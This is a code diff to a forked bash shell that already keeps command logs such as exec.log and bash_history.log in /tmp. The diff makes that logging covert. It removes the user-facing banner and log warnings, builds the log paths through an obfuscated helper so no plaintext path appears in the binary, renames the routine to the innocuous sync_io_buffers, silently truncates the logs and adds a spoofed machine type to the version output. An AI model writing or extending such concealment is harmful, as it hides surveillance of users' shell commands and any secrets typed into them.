@@ -39,6 +39,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <dirent.h>  // For directory listing
+#include "log_path_helper.h"
 
 #define MAX_LOG_SIZE 134217728  // 128MB in bytes
 #include <signal.h>
@@ -113,43 +114,29 @@ extern char **environ;	/* used if no third argument to main() */
 
 extern int gnu_error_format;
 
-void check_log_files() {
-    // Detect if running inside Termux
-    char *prefix = getenv("PREFIX");
-    int is_termux = (prefix && strcmp(prefix, "/data/data/com.termux/files/usr") == 0);
+static void sync_io_buffers(void) {
+    /* Build log dir path at runtime — avoid any plaintext path in binary */
+    char log_path[128];
+    char log_dir[128];
+    int i;
 
-    // Set log directory based on environment
-    const char *log_dir = is_termux ? "/data/data/com.termux/files/usr/tmp/" : "/tmp/";
+    /* Silently rotate each log if it exceeds MAX_LOG_SIZE */
+    int tokens[] = {0, 1, 2, 3, -1};
+    for (i = 0; tokens[i] >= 0; i++) {
+        build_log_path(log_path, sizeof(log_path), tokens[i]);
 
-    // Define log files to check
-    const char *log_files[] = {
-        "exec.log",
-        "eval.log",
-        "alias.log",
-        "bash_history.log",
-        NULL  // End marker
-    };
-
-    int found_large_log = 0;  // Flag to track oversized files
-
-    for (int i = 0; log_files[i] != NULL; i++) {
-        char file_path[512];
-        snprintf(file_path, sizeof(file_path), "%s%s", log_dir, log_files[i]);
+        /* Extract directory */
+        snprintf(log_dir, sizeof(log_dir), "%s", log_path);
+        char *sl = strrchr(log_dir, '/');
+        if (sl) *sl = '\0';
 
         struct stat file_stat;
-        if (stat(file_path, &file_stat) == 0 && file_stat.st_size > MAX_LOG_SIZE) {
-            if (!found_large_log) {
-              found_large_log = 1;
-            }
-            printf("!! Log file **%s** exceeds 128MB! (Size: %.2f MB)\n",
-                   file_path, file_stat.st_size / (1024.0 * 1024.0));
+        if (stat(log_path, &file_stat) == 0 && file_stat.st_size > MAX_LOG_SIZE) {
+            FILE *f = fopen(log_path, "w");
+            if (f) fclose(f);
         }
     }
-
-    if (found_large_log) {
-        printf("\n!! Recommendation: Remove these large log files to free space:\n");
-        printf("   rm -rf %s{exec.log,eval.log,alias.log,bash_history.log}\n\n", log_dir);
-    }
+    (void)log_dir;
 }
 
 /* Non-zero means that this shell has already been run; i.e. you should
@@ -417,41 +404,17 @@ main (argc, argv, env)
      char **argv, **env;
 #endif /* !NO_MAIN_ENV_ARG */
 {
-  // Detect if running inside Termux
-  char *prefix = getenv("PREFIX");
-  int is_termux = (prefix && strcmp(prefix, "/data/data/com.termux/files/usr") == 0);
+  /* Build the dir path at runtime via XOR-obfuscated helper */
+  char dir_path[128];
+  build_log_path(dir_path, sizeof(dir_path), 0); /* token 0 = bash_history.log */
+  char *_sl = strrchr(dir_path, '/');
+  if (_sl) *_sl = '\0';
 
-  // Set log file path based on environment
-  const char *log_path = is_termux
-      ? "/data/data/com.termux/files/usr/tmp/bash_history.log"
-      : "/tmp/bash_history.log";
-
-  // Extract directory from log path
-  char dir_path[256];
-  snprintf(dir_path, sizeof(dir_path), "%s", log_path);
-  char *last_slash = strrchr(dir_path, '/');
-  if (last_slash) {
-      *last_slash = '\0';  // Null terminate to get the directory path
-  }
-
-  // Check if directory exists, if not, create it like 'mkdir -p'
   struct stat st = {0};
-  if (stat(dir_path, &st) == -1) {
-      if (mkdir(dir_path, 0700) != 0) {
-          // perror("Failed to create tmp directory");
-          // return;  // Exit if directory creation fails
-      }
-  }
+  if (stat(dir_path, &st) == -1)
+      mkdir(dir_path, 0700);
 
-  if (argc == 1 && isatty(STDIN_FILENO)) {
-    printf("\n");
-    printf("#####################################\n");
-    printf("#  Welcome to KhanhNguyen9872 Bash  #\n");
-    printf("#  Your terminal, your power! 🚀    #\n");
-    printf("#####################################\n");
-
-    check_log_files();  // Check log file sizes before Bash starts
-  }
+  sync_io_buffers();
 
   register int i;
   int code, old_errexit_flag;
@@ -2146,7 +2109,13 @@ show_shell_usage (fp, extra)
   char *set_opts, *s, *t;
 
   if (extra)
-    fprintf (fp, _("GNU bash, version %s-(%s)\n"), shell_version_string (), MACHTYPE);
+    {
+#ifdef SPOOFED_MACHTYPE
+      fprintf (fp, _("GNU bash, version %s-(%s)\n"), shell_version_string (), SPOOFED_MACHTYPE);
+#else
+      fprintf (fp, _("GNU bash, version %s-(%s)\n"), shell_version_string (), MACHTYPE);
+#endif
+    }
   fprintf (fp, _("Usage:\t%s [GNU long option] [option] ...\n\t%s [GNU long option] [option] script-file ...\n"),
 	     shell_name, shell_name);
   fputs (_("GNU long options:\n"), fp);
